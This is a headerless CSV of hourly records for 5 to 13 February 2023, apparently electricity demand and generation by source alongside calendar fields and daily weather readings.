2023-02-05 10:00:00,6327,9384,1394,2704,2376,1589,970,282,67,107,2023-02-05 10:00:00,10,5,1,67,61,55,4,96,82,11,0
2023-02-05 11:00:00,6288,9386,1398,2710,2386,1565,970,288,68,108,2023-02-05 11:00:00,11,5,1,67,61,55,4,96,82,11,0
2023-02-05 12:00:00,6302,9300,1399,2713,2233,1578,969,339,68,109,2023-02-05 12:00:00,12,5,1,67,61,55,4,96,82,11,0
2023-02-05 13:00:00,6228,9165,1398,2730,2139,1570,964,297,65,110,2023-02-05 13:00:00,13,5,1,67,61,55,4,96,82,11,0
2023-02-05 14:00:00,6192,9174,1398,2723,2165,1596,957,270,63,111,2023-02-05 14:00:00,14,5,1,67,61,55,4,96,82,11,0
2023-02-05 15:00:00,6237,9112,1396,2701,2192,1613,971,169,67,112,2023-02-05 15:00:00,15,5,1,67,61,55,4,96,82,11,0
2023-02-05 16:00:00,6490,9111,1394,2680,2258,1651,1007,51,69,113,2023-02-05 16:00:00,16,5,1,67,61,55,4,96,82,11,0
2023-02-05 17:00:00,6730,9100,1397,2640,2362,1625,1003,3,68,114,2023-02-05 17:00:00,17,5,1,67,61,55,4,96,82,11,0
2023-02-05 18:00:00,7114,9403,1397,2644,2605,1668,1019,0,69,115,2023-02-05 18:00:00,18,5,1,67,61,55,4,96,82,11,0
2023-02-05 19:00:00,7134,9366,1398,2604,2646,1648,1002,0,69,116,2023-02-05 19:00:00,19,5,1,67,61,55,4,96,82,11,0
2023-02-05 20:00:00,7060,9231,1396,2591,2537,1643,993,0,69,117,2023-02-05 20:00:00,20,5,1,67,61,55,4,96,82,11,0
2023-02-05 21:00:00,6696,9084,1395,2437,2540,1655,988,0,69,118,2023-02-05 21:00:00,21,5,1,67,61,55,4,96,82,11,0
2023-02-05 22:00:00,6296,9028,1396,2359,2550,1677,979,0,67,119,2023-02-05 22:00:00,22,5,1,67,61,55,4,96,82,11,0
2023-02-05 23:00:00,6034,8976,1401,2476,2278,1763,992,0,66,120,2023-02-05 23:00:00,23,5,1,67,61,55,4,96,82,11,0
2023-02-06 00:00:00,5747,8550,1399,2575,1910,1656,943,0,65,121,2023-02-06 00:00:00,0,6,2,59,50,40,16,86,58,10,0
2023-02-06 01:00:00,5554,8372,1401,2536,1780,1635,952,0,66,122,2023-02-06 01:00:00,1,6,2,59,50,40,16,86,58,10,0
2023-02-06 02:00:00,5511,8463,1403,2565,1810,1672,949,0,65,123,2023-02-06 02:00:00,2,6,2,59,50,40,16,86,58,10,0
2023-02-06 03:00:00,5503,8438,1399,2537,1803,1687,945,0,65,124,2023-02-06 03:00:00,3,6,2,59,50,40,16,86,58,10,0
2023-02-06 04:00:00,5609,8316,1399,2433,1766,1695,957,0,65,125,2023-02-06 04:00:00,4,6,2,59,50,40,16,86,58,10,0
2023-02-06 05:00:00,5800,8338,1400,2321,1879,1733,943,0,62,126,2023-02-06 05:00:00,5,6,2,59,50,40,16,86,58,10,0
2023-02-06 06:00:00,6518,8555,1399,2348,2061,1740,940,0,65,127,2023-02-06 06:00:00,6,6,2,59,50,40,16,86,58,10,0
2023-02-06 07:00:00,7518,9128,1399,2440,2456,1764,1002,0,66,128,2023-02-06 07:00:00,7,6,2,59,50,40,16,86,58,10,0
2023-02-06 08:00:00,8107,9424,1400,2487,2594,1789,1064,21,66,129,2023-02-06 08:00:00,8,6,2,59,50,40,16,86,58,10,0
2023-02-06 09:00:00,8298,9445,1334,2565,2522,1757,1095,104,67,130,2023-02-06 09:00:00,9,6,2,59,50,40,16,86,58,10,0
2023-02-06 10:00:00,8247,9602,1357,2631,2526,1714,1088,215,68,131,2023-02-06 10:00:00,10,6,2,59,50,40,16,86,58,10,0
2023-02-06 11:00:00,8078,9384,1349,2646,2229,1706,1085,314,53,132,2023-02-06 11:00:00,11,6,2,59,50,40,16,86,58,10,0
2023-02-06 12:00:00,8091,9348,1334,2658,2148,1691,1061,399,55,133,2023-02-06 12:00:00,12,6,2,59,50,40,16,86,58,10,0
2023-02-06 13:00:00,8013,9265,1355,2634,2079,1712,1035,394,55,134,2023-02-06 13:00:00,13,6,2,59,50,40,16,86,58,10,0
2023-02-06 14:00:00,7889,9397,1356,2633,2270,1719,1024,329,63,135,2023-02-06 14:00:00,14,6,2,59,50,40,16,86,58,10,0
2023-02-06 15:00:00,7803,9371,1369,2675,2289,1703,1059,206,67,136,2023-02-06 15:00:00,15,6,2,59,50,40,16,86,58,10,0
2023-02-06 16:00:00,7819,9180,1327,2678,2257,1700,1067,81,69,137,2023-02-06 16:00:00,16,6,2,59,50,40,16,86,58,10,0
2023-02-06 17:00:00,7950,9227,1357,2660,2366,1676,1093,5,68,138,2023-02-06 17:00:00,17,6,2,59,50,40,16,86,58,10,0
2023-02-06 18:00:00,8243,9305,1385,2668,2407,1668,1109,0,68,139,2023-02-06 18:00:00,18,6,2,59,50,40,16,86,58,10,0
2023-02-06 19:00:00,8184,9299,1382,2665,2408,1666,1107,0,69,140,2023-02-06 19:00:00,19,6,2,59,50,40,16,86,58,10,0
2023-02-06 20:00:00,8059,9249,1389,2684,2344,1670,1092,0,70,141,2023-02-06 20:00:00,20,6,2,59,50,40,16,86,58,10,0
2023-02-06 21:00:00,7682,9192,1391,2662,2319,1658,1091,0,69,142,2023-02-06 21:00:00,21,6,2,59,50,40,16,86,58,10,0
2023-02-06 22:00:00,6991,9013,1393,2638,2244,1624,1046,0,66,143,2023-02-06 22:00:00,22,6,2,59,50,40,16,86,58,10,0
2023-02-06 23:00:00,6529,8853,1390,2629,2080,1662,1027,0,65,144,2023-02-06 23:00:00,23,6,2,59,50,40,16,86,58,10,0
2023-02-07 00:00:00,6241,8436,1388,2582,1723,1640,1036,0,66,145,2023-02-07 00:00:00,0,7,3,51,42,33,23,91,72,9,0
2023-02-07 01:00:00,6032,8413,1392,2577,1662,1707,1007,0,66,146,2023-02-07 01:00:00,1,7,3,51,42,33,23,91,72,9,0
2023-02-07 02:00:00,5991,8381,1396,2594,1617,1714,994,0,65,147,2023-02-07 02:00:00,2,7,3,51,42,33,23,91,72,9,0
2023-02-07 03:00:00,5925,8405,1398,2576,1684,1699,980,0,67,148,2023-02-07 03:00:00,3,7,3,51,42,33,23,91,72,9,0
2023-02-07 04:00:00,6019,8363,1397,2585,1635,1688,989,0,68,149,2023-02-07 04:00:00,4,7,3,51,42,33,23,91,72,9,0
2023-02-07 05:00:00,6218,8347,1397,2544,1680,1638,1021,0,67,150,2023-02-07 05:00:00,5,7,3,51,42,33,23,91,72,9,0
2023-02-07 06:00:00,6803,8398,1397,2493,1788,1617,1034,0,68,151,2023-02-07 06:00:00,6,7,3,51,42,33,23,91,72,9,0
2023-02-07 07:00:00,7544,8868,1398,2377,2275,1671,1078,1,67,152,2023-02-07 07:00:00,7,7,3,51,42,33,23,91,72,9,0
2023-02-07 08:00:00,8255,9058,1396,2155,2515,1729,1128,66,68,153,2023-02-07 08:00:00,8,7,3,51,42,33,23,91,72,9,0
2023-02-07 09:00:00,8386,9084,1363,1994,2546,1773,1140,199,67,154,2023-02-07 09:00:00,9,7,3,51,42,33,23,91,72,9,0
2023-02-07 10:00:00,8220,9096,1372,1865,2608,1723,1091,368,68,155,2023-02-07 10:00:00,10,7,3,51,42,33,23,91,72,9,0
2023-02-07 11:00:00,7933,8779,1354,1625,2319,1759,1106,546,69,156,2023-02-07 11:00:00,11,7,3,51,42,33,23,91,72,9,0
2023-02-07 12:00:00,7833,8686,1366,1595,2257,1716,1093,591,66,157,2023-02-07 12:00:00,12,7,3,51,42,33,23,91,72,9,0
2023-02-07 13:00:00,7812,8679,1380,1753,2238,1651,1024,564,67,158,2023-02-07 13:00:00,13,7,3,51,42,33,23,91,72,9,0
2023-02-07 14:00:00,7675,8526,1355,1616,2304,1715,1028,440,65,159,2023-02-07 14:00:00,14,7,3,51,42,33,23,91,72,9,0
2023-02-07 15:00:00,7622,8309,1362,1316,2339,1818,1117,287,69,160,2023-02-07 15:00:00,15,7,3,51,42,33,23,91,72,9,0
2023-02-07 16:00:00,7677,8279,1376,1128,2579,1843,1146,138,68,161,2023-02-07 16:00:00,16,7,3,51,42,33,23,91,72,9,0
2023-02-07 17:00:00,7848,8030,1376,1068,2539,1809,1145,23,69,162,2023-02-07 17:00:00,17,7,3,51,42,33,23,91,72,9,0
2023-02-07 18:00:00,8183,8067,1385,1007,2639,1820,1146,0,69,163,2023-02-07 18:00:00,18,7,3,51,42,33,23,91,72,9,0
2023-02-07 19:00:00,8167,8092,1381,914,2717,1846,1164,0,70,164,2023-02-07 19:00:00,19,7,3,51,42,33,23,91,72,9,0
2023-02-07 20:00:00,8047,8166,1388,843,2802,1897,1165,0,70,165,2023-02-07 20:00:00,20,7,3,51,42,33,23,91,72,9,0
2023-02-07 21:00:00,7694,7983,1393,887,2714,1870,1048,0,69,166,2023-02-07 21:00:00,21,7,3,51,42,33,23,91,72,9,0
2023-02-07 22:00:00,7128,7777,1396,850,2601,1853,1008,0,69,167,2023-02-07 22:00:00,22,7,3,51,42,33,23,91,72,9,0
2023-02-07 23:00:00,6568,7545,1394,892,2377,1820,993,0,68,168,2023-02-07 23:00:00,23,7,3,51,42,33,23,91,72,9,0
2023-02-08 00:00:00,6235,7324,1396,1094,1982,1792,990,0,69,169,2023-02-08 00:00:00,0,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 01:00:00,6038,7117,1396,1370,1623,1682,976,0,70,170,2023-02-08 01:00:00,1,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 02:00:00,5990,7323,1400,1684,1542,1649,979,0,69,171,2023-02-08 02:00:00,2,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 03:00:00,5923,7362,1400,1771,1511,1640,971,0,68,172,2023-02-08 03:00:00,3,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 04:00:00,6068,7507,1401,1671,1611,1746,1007,0,69,173,2023-02-08 04:00:00,4,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 05:00:00,6256,7698,1401,1888,1605,1732,1002,0,69,174,2023-02-08 05:00:00,5,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 06:00:00,6823,7839,1400,2215,1601,1608,944,0,69,175,2023-02-08 06:00:00,6,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 07:00:00,7615,8506,1397,2304,2101,1663,969,2,69,176,2023-02-08 07:00:00,7,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 08:00:00,8263,8904,1399,2428,2261,1672,995,78,70,177,2023-02-08 08:00:00,8,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 09:00:00,8305,8886,1367,2416,2233,1622,976,203,68,178,2023-02-08 09:00:00,9,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 10:00:00,8234,9059,1377,2452,2207,1612,963,375,69,179,2023-02-08 10:00:00,10,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 11:00:00,8017,8893,1353,2356,2011,1660,984,459,71,180,2023-02-08 11:00:00,11,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 12:00:00,7948,8966,1362,2288,2078,1744,943,481,69,181,2023-02-08 12:00:00,12,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 13:00:00,7867,8867,1364,2260,2083,1665,913,512,69,182,2023-02-08 13:00:00,13,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 14:00:00,7664,8681,1349,2350,1914,1634,899,463,69,183,2023-02-08 14:00:00,14,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 15:00:00,7512,8453,1382,2418,1687,1658,910,324,71,184,2023-02-08 15:00:00,15,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 16:00:00,7626,8414,1387,2467,1733,1670,935,148,72,185,2023-02-08 16:00:00,16,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 17:00:00,7798,8307,1392,2406,1791,1677,938,29,71,186,2023-02-08 17:00:00,17,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 18:00:00,8276,8534,1391,2281,2166,1686,934,4,71,187,2023-02-08 18:00:00,18,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 19:00:00,8271,8687,1393,2302,2291,1694,934,0,72,188,2023-02-08 19:00:00,19,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 20:00:00,7993,8695,1391,2397,2253,1647,934,0,71,189,2023-02-08 20:00:00,20,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 21:00:00,7772,8700,1392,2409,2225,1669,934,0,71,190,2023-02-08 21:00:00,21,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 22:00:00,7187,8555,1393,2333,2155,1668,936,0,70,191,2023-02-08 22:00:00,22,8,4,44,38,32,27,95,88,10,0.01
2023-02-08 23:00:00,6697,8253,1397,2218,1927,1704,936,0,69,192,2023-02-08 23:00:00,23,8,4,44,38,32,27,95,88,10,0.01
2023-02-09 00:00:00,6372,7889,1398,2160,1665,1616,981,0,69,193,2023-02-09 00:00:00,0,9,5,54,44,34,21,96,81,14,0
2023-02-09 01:00:00,6179,7789,1398,2146,1497,1637,1044,0,68,194,2023-02-09 01:00:00,1,9,5,54,44,34,21,96,81,14,0
2023-02-09 02:00:00,6098,7624,1397,1988,1525,1663,983,0,67,195,2023-02-09 02:00:00,2,9,5,54,44,34,21,96,81,14,0
2023-02-09 03:00:00,6010,7462,1398,1761,1551,1684,999,0,68,196,2023-02-09 03:00:00,3,9,5,54,44,34,21,96,81,14,0
2023-02-09 04:00:00,6096,7443,1397,1680,1581,1703,1014,0,68,197,2023-02-09 04:00:00,4,9,5,54,44,34,21,96,81,14,0
2023-02-09 05:00:00,6337,7409,1400,1507,1641,1766,1027,0,67,198,2023-02-09 05:00:00,5,9,5,54,44,34,21,96,81,14,0
2023-02-09 06:00:00,6913,7414,1400,1477,1755,1703,1013,0,64,199,2023-02-09 06:00:00,6,9,5,54,44,34,21,96,81,14,0
2023-02-09 07:00:00,7599,7804,1398,1382,2219,1731,1008,0,65,200,2023-02-09 07:00:00,7,9,5,54,44,34,21,96,81,14,0
2023-02-09 08:00:00,8187,7870,1400,1312,2373,1552,1046,120,64,201,2023-02-09 08:00:00,8,9,5,54,44,34,21,96,81,14,0
2023-02-09 09:00:00,8317,7605,1332,1072,2323,1403,1031,375,65,202,2023-02-09 09:00:00,9,9,5,54,44,34,21,96,81,14,0
2023-02-09 10:00:00,8133,7433,1339,734,2354,1387,1028,525,65,203,2023-02-09 10:00:00,10,9,5,54,44,34,21,96,81,14,0
2023-02-09 11:00:00,7844,7328,1354,608,2214,1433,995,656,65,204,2023-02-09 11:00:00,11,9,5,54,44,34,21,96,81,14,0
2023-02-09 12:00:00,7683,7188,1368,466,2036,1593,918,742,64,205,2023-02-09 12:00:00,12,9,5,54,44,34,21,96,81,14,0
2023-02-09 13:00:00,7671,7024,1358,420,1912,1655,907,707,64,206,2023-02-09 13:00:00,13,9,5,54,44,34,21,96,81,14,0
2023-02-09 14:00:00,7507,6991,1353,410,1928,1684,923,628,63,207,2023-02-09 14:00:00,14,9,5,54,44,34,21,96,81,14,0
2023-02-09 15:00:00,7448,6805,1368,401,1910,1680,915,465,65,208,2023-02-09 15:00:00,15,9,5,54,44,34,21,96,81,14,0
2023-02-09 16:00:00,7543,6622,1378,355,1970,1691,915,247,64,209,2023-02-09 16:00:00,16,9,5,54,44,34,21,96,81,14,0
2023-02-09 17:00:00,7820,6624,1367,354,2130,1720,938,48,65,210,2023-02-09 17:00:00,17,9,5,54,44,34,21,96,81,14,0
2023-02-09 18:00:00,8208,6906,1376,325,2458,1726,954,0,66,211,2023-02-09 18:00:00,18,9,5,54,44,34,21,96,81,14,0
2023-02-09 19:00:00,8218,6986,1388,275,2489,1736,1032,0,66,212,2023-02-09 19:00:00,19,9,5,54,44,34,21,96,81,14,0
2023-02-09 20:00:00,8162,7074,1383,224,2574,1772,1056,0,65,213,2023-02-09 20:00:00,20,9,5,54,44,34,21,96,81,14,0
2023-02-09 21:00:00,7810,6850,1383,160,2489,1739,1012,0,66,214,2023-02-09 21:00:00,21,9,5,54,44,34,21,96,81,14,0
2023-02-09 22:00:00,7136,6598,1383,97,2353,1711,988,0,65,215,2023-02-09 22:00:00,22,9,5,54,44,34,21,96,81,14,0
2023-02-09 23:00:00,6675,6396,1386,64,2103,1781,998,0,64,216,2023-02-09 23:00:00,23,9,5,54,44,34,21,96,81,14,0
2023-02-10 00:00:00,6369,5956,1392,54,1726,1710,1015,0,58,217,2023-02-10 00:00:00,0,10,6,56,42,28,23,95,78,10,0
2023-02-10 01:00:00,6258,5971,1394,63,1743,1661,1047,0,63,218,2023-02-10 01:00:00,1,10,6,56,42,28,23,95,78,10,0
2023-02-10 02:00:00,6123,6013,1394,108,1892,1525,1032,0,61,219,2023-02-10 02:00:00,2,10,6,56,42,28,23,95,78,10,0
2023-02-10 03:00:00,6070,6044,1395,212,1623,1720,1031,0,62,220,2023-02-10 03:00:00,3,10,6,56,42,28,23,95,78,10,0
2023-02-10 04:00:00,6192,6009,1395,311,1526,1709,1009,0,58,221,2023-02-10 04:00:00,4,10,6,56,42,28,23,95,78,10,0
2023-02-10 05:00:00,6380,6222,1397,346,1551,1854,1012,0,61,222,2023-02-10 05:00:00,5,10,6,56,42,28,23,95,78,10,0
2023-02-10 06:00:00,7030,6283,1394,309,1710,1814,997,0,58,223,2023-02-10 06:00:00,6,10,6,56,42,28,23,95,78,10,0
2023-02-10 07:00:00,7745,6941,1393,259,2325,1884,1024,3,52,224,2023-02-10 07:00:00,7,10,6,56,42,28,23,95,78,10,0
2023-02-10 08:00:00,8150,7131,1397,274,2375,1875,1034,114,60,225,2023-02-10 08:00:00,8,10,6,56,42,28,23,95,78,10,0
2023-02-10 09:00:00,8279,7090,1376,337,2277,1677,999,362,61,226,2023-02-10 09:00:00,9,10,6,56,42,28,23,95,78,10,0
2023-02-10 10:00:00,8042,7227,1323,314,2203,1801,957,572,54,227,2023-02-10 10:00:00,10,10,6,56,42,28,23,95,78,10,0
2023-02-10 11:00:00,7745,7019,1334,251,2014,1820,889,654,56,228,2023-02-10 11:00:00,11,10,6,56,42,28,23,95,78,10,0
2023-02-10 12:00:00,7629,6985,1348,219,1930,1811,898,717,60,229,2023-02-10 12:00:00,12,10,6,56,42,28,23,95,78,10,0
2023-02-10 13:00:00,7546,6849,1354,215,1772,1818,904,723,63,230,2023-02-10 13:00:00,13,10,6,56,42,28,23,95,78,10,0
2023-02-10 14:00:00,7424,7082,1369,252,1988,1833,920,654,64,231,2023-02-10 14:00:00,14,10,6,56,42,28,23,95,78,10,0
2023-02-10 15:00:00,7371,6843,1366,280,1892,1833,905,499,66,232,2023-02-10 15:00:00,15,10,6,56,42,28,23,95,78,10,0
2023-02-10 16:00:00,7569,6782,1380,263,2039,1849,932,249,67,233,2023-02-10 16:00:00,16,10,6,56,42,28,23,95,78,10,0
2023-02-10 17:00:00,7902,6821,1388,203,2336,1865,943,19,66,234,2023-02-10 17:00:00,17,10,6,56,42,28,23,95,78,10,0
2023-02-10 18:00:00,8216,6986,1387,251,2450,1839,989,0,67,235,2023-02-10 18:00:00,18,10,6,56,42,28,23,95,78,10,0
2023-02-10 19:00:00,8201,7152,1383,335,2443,1886,1035,0,67,236,2023-02-10 19:00:00,19,10,6,56,42,28,23,95,78,10,0
2023-02-10 20:00:00,8100,7233,1386,415,2441,1882,1040,0,67,237,2023-02-10 20:00:00,20,10,6,56,42,28,23,95,78,10,0
2023-02-10 21:00:00,7610,7273,1384,635,2315,1864,1007,0,66,238,2023-02-10 21:00:00,21,10,6,56,42,28,23,95,78,10,0
2023-02-10 22:00:00,7031,7264,1389,812,2160,1839,995,0,67,239,2023-02-10 22:00:00,22,10,6,56,42,28,23,95,78,10,0
2023-02-10 23:00:00,6657,7137,1391,891,1963,1846,981,0,65,240,2023-02-10 23:00:00,23,10,6,56,42,28,23,95,78,10,0
2023-02-11 00:00:00,6344,6827,1395,933,1604,1843,985,0,65,241,2023-02-11 00:00:00,0,11,7,56,44,31,22,95,75,10,0
2023-02-11 01:00:00,6174,6624,1393,918,1479,1757,1011,0,65,242,2023-02-11 01:00:00,1,11,7,56,44,31,22,95,75,10,0
2023-02-11 02:00:00,6012,6490,1399,857,1448,1727,995,0,64,243,2023-02-11 02:00:00,2,11,7,56,44,31,22,95,75,10,0
2023-02-11 03:00:00,5996,6375,1396,643,1493,1755,1022,0,65,244,2023-02-11 03:00:00,3,11,7,56,44,31,22,95,75,10,0
2023-02-11 04:00:00,6049,6226,1397,385,1525,1812,1040,0,65,245,2023-02-11 04:00:00,4,11,7,56,44,31,22,95,75,10,0
2023-02-11 05:00:00,6153,6135,1399,317,1526,1798,1031,0,65,246,2023-02-11 05:00:00,5,11,7,56,44,31,22,95,75,10,0
2023-02-11 06:00:00,6312,6094,1395,222,1652,1747,1013,0,64,247,2023-02-11 06:00:00,6,11,7,56,44,31,22,95,75,10,0
2023-02-11 07:00:00,6661,6590,1399,197,2161,1763,998,4,65,248,2023-02-11 07:00:00,7,11,7,56,44,31,22,95,75,10,0
2023-02-11 08:00:00,7083,6687,1395,124,2189,1792,1009,111,67,249,2023-02-11 08:00:00,8,11,7,56,44,31,22,95,75,10,0
2023-02-11 09:00:00,7306,6836,1396,37,2181,1783,999,378,65,250,2023-02-11 09:00:00,9,11,7,56,44,31,22,95,75,10,0
2023-02-11 10:00:00,7188,6777,1398,16,2103,1654,978,562,65,251,2023-02-11 10:00:00,10,11,7,56,44,31,22,95,75,10,0
2023-02-11 11:00:00,7016,6706,1395,46,2021,1600,925,652,65,252,2023-02-11 11:00:00,11,11,7,56,44,31,22,95,75,10,0
2023-02-11 12:00:00,6858,6670,1398,108,1865,1638,904,691,65,253,2023-02-11 12:00:00,12,11,7,56,44,31,22,95,75,10,0
2023-02-11 13:00:00,6770,6676,1397,186,1758,1681,950,637,66,254,2023-02-11 13:00:00,13,11,7,56,44,31,22,95,75,10,0
2023-02-11 14:00:00,6625,6518,1398,283,1620,1683,935,533,65,255,2023-02-11 14:00:00,14,11,7,56,44,31,22,95,75,10,0
2023-02-11 15:00:00,6602,6459,1397,339,1620,1687,937,411,66,256,2023-02-11 15:00:00,15,11,7,56,44,31,22,95,75,10,0
2023-02-11 16:00:00,6869,6452,1397,474,1677,1702,942,192,66,257,2023-02-11 16:00:00,16,11,7,56,44,31,22,95,75,10,0
2023-02-11 17:00:00,7194,6583,1398,651,1786,1708,953,17,68,258,2023-02-11 17:00:00,17,11,7,56,44,31,22,95,75,10,0
2023-02-11 18:00:00,7675,7320,1397,908,2316,1694,936,0,69,259,2023-02-11 18:00:00,18,11,7,56,44,31,22,95,75,10,0
2023-02-11 19:00:00,7600,7665,1399,1329,2307,1633,927,0,69,260,2023-02-11 19:00:00,19,11,7,56,44,31,22,95,75,10,0
2023-02-11 20:00:00,7339,7740,1397,1523,2215,1601,934,0,70,261,2023-02-11 20:00:00,20,11,7,56,44,31,22,95,75,10,0
2023-02-11 21:00:00,7069,7804,1398,1541,2216,1666,912,0,70,262,2023-02-11 21:00:00,21,11,7,56,44,31,22,95,75,10,0
2023-02-11 22:00:00,6613,7717,1398,1540,2097,1695,919,0,67,263,2023-02-11 22:00:00,22,11,7,56,44,31,22,95,75,10,0
2023-02-11 23:00:00,6288,7529,1402,1545,1863,1732,924,0,63,264,2023-02-11 23:00:00,23,11,7,56,44,31,22,95,75,10,0
2023-02-12 00:00:00,5995,6998,1401,1542,1400,1663,930,0,63,265,2023-02-12 00:00:00,0,12,1,71,60,48,6,85,73,20,0
2023-02-12 01:00:00,5745,6893,1399,1482,1303,1720,925,0,63,266,2023-02-12 01:00:00,1,12,1,71,60,48,6,85,73,20,0
2023-02-12 02:00:00,5590,6648,1402,1191,1318,1748,927,0,63,267,2023-02-12 02:00:00,2,12,1,71,60,48,6,85,73,20,0
2023-02-12 03:00:00,5528,6664,1400,1024,1467,1774,933,0,65,268,2023-02-12 03:00:00,3,12,1,71,60,48,6,85,73,20,0
2023-02-12 04:00:00,5539,6512,1401,925,1446,1753,922,0,65,269,2023-02-12 04:00:00,4,12,1,71,60,48,6,85,73,20,0
2023-02-12 05:00:00,5581,6511,1402,919,1464,1744,916,0,64,270,2023-02-12 05:00:00,5,12,1,71,60,48,6,85,73,20,0
2023-02-12 06:00:00,5699,6293,1400,730,1475,1706,917,0,64,271,2023-02-12 06:00:00,6,12,1,71,60,48,6,85,73,20,0
2023-02-12 07:00:00,5840,6312,1403,777,1467,1686,915,0,63,272,2023-02-12 07:00:00,7,12,1,71,60,48,6,85,73,20,0
2023-02-12 08:00:00,6124,6817,1403,953,1760,1689,921,27,63,273,2023-02-12 08:00:00,8,12,1,71,60,48,6,85,73,20,0
2023-02-12 09:00:00,6361,6886,1402,994,1698,1691,921,115,63,274,2023-02-12 09:00:00,9,12,1,71,60,48,6,85,73,20,0
2023-02-12 10:00:00,6467,7080,1403,1089,1705,1703,922,199,58,275,2023-02-12 10:00:00,10,12,1,71,60,48,6,85,73,20,0
2023-02-12 11:00:00,6345,7237,1401,1289,1656,1636,902,293,59,276,2023-02-12 11:00:00,11,12,1,71,60,48,6,85,73,20,0
2023-02-12 12:00:00,6288,7461,1402,1414,1602,1683,928,371,60,277,2023-02-12 12:00:00,12,12,1,71,60,48,6,85,73,20,0
2023-02-12 13:00:00,6127,7545,1400,1493,1583,1686,923,398,60,278,2023-02-12 13:00:00,13,12,1,71,60,48,6,85,73,20,0
2023-02-12 14:00:00,6086,7452,1400,1513,1494,1687,926,370,60,279,2023-02-12 14:00:00,14,12,1,71,60,48,6,85,73,20,0
2023-02-12 15:00:00,5984,7657,1400,1708,1626,1656,913,289,63,280,2023-02-12 15:00:00,15,12,1,71,60,48,6,85,73,20,0
2023-02-12 16:00:00,6105,7589,1399,1779,1628,1613,917,186,64,281,2023-02-12 16:00:00,16,12,1,71,60,48,6,85,73,20,0
2023-02-12 17:00:00,6453,7752,1398,1933,1722,1635,972,26,64,282,2023-02-12 17:00:00,17,12,1,71,60,48,6,85,73,20,0
2023-02-12 18:00:00,6998,7986,1402,1956,1883,1668,1012,0,64,283,2023-02-12 18:00:00,18,12,1,71,60,48,6,85,73,20,0
2023-02-12 19:00:00,7083,8054,1403,1979,1951,1684,974,0,63,284,2023-02-12 19:00:00,19,12,1,71,60,48,6,85,73,20,0
2023-02-12 20:00:00,6960,7949,1398,1981,1905,1681,919,0,63,285,2023-02-12 20:00:00,20,12,1,71,60,48,6,85,73,20,0
2023-02-12 21:00:00,6882,7981,1394,2004,1875,1706,936,0,65,286,2023-02-12 21:00:00,21,12,1,71,60,48,6,85,73,20,0
2023-02-12 22:00:00,6404,7656,1396,1636,1921,1704,935,0,63,287,2023-02-12 22:00:00,22,12,1,71,60,48,6,85,73,20,0
2023-02-12 23:00:00,5954,7197,1395,1444,1619,1748,928,0,63,288,2023-02-12 23:00:00,23,12,1,71,60,48,6,85,73,20,0
2023-02-13 00:00:00,5733,6749,1399,1179,1433,1740,933,0,64,289,2023-02-13 00:00:00,0,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 01:00:00,5535,6588,1396,1102,1420,1697,909,0,64,290,2023-02-13 01:00:00,1,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 02:00:00,5457,6487,1400,918,1453,1729,924,0,62,291,2023-02-13 02:00:00,2,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 03:00:00,5453,6402,1401,868,1428,1730,911,0,63,292,2023-02-13 03:00:00,3,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 04:00:00,5576,6310,1402,773,1428,1730,911,0,65,293,2023-02-13 04:00:00,4,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 05:00:00,5784,6149,1398,586,1462,1732,907,0,65,294,2023-02-13 05:00:00,5,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 06:00:00,6349,5857,1400,421,1431,1648,893,0,64,295,2023-02-13 06:00:00,6,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 07:00:00,7406,6328,1399,197,1908,1759,990,10,64,296,2023-02-13 07:00:00,7,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 08:00:00,8136,6688,1399,155,2040,1764,1104,159,65,297,2023-02-13 08:00:00,8,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 09:00:00,8204,6820,1349,204,1928,1778,1121,373,65,298,2023-02-13 09:00:00,9,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 10:00:00,7997,6920,1313,219,1911,1764,1120,527,64,299,2023-02-13 10:00:00,10,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 11:00:00,7732,6802,1335,214,1802,1661,1088,637,63,300,2023-02-13 11:00:00,11,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 12:00:00,7620,6795,1348,297,1690,1698,1005,691,64,301,2023-02-13 12:00:00,12,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 13:00:00,7468,6821,1373,363,1700,1656,975,690,62,302,2023-02-13 13:00:00,13,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 14:00:00,7348,6625,1340,468,1541,1636,984,592,63,303,2023-02-13 14:00:00,14,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 15:00:00,7321,6569,1354,549,1505,1673,1021,401,65,304,2023-02-13 15:00:00,15,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 16:00:00,7377,6342,1347,453,1552,1675,1032,215,65,305,2023-02-13 16:00:00,16,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 17:00:00,7570,6215,1348,431,1609,1686,1044,30,66,306,2023-02-13 17:00:00,17,13,2,61,54,47,11,93,73,15,0.05
2023-02-13 18:00:00,7958,6634,1378,455,2000,1691,1037,0,65,307,2023-02-13 18:00:00,18,13,2,61,54,47,11,93,73,15,0.05
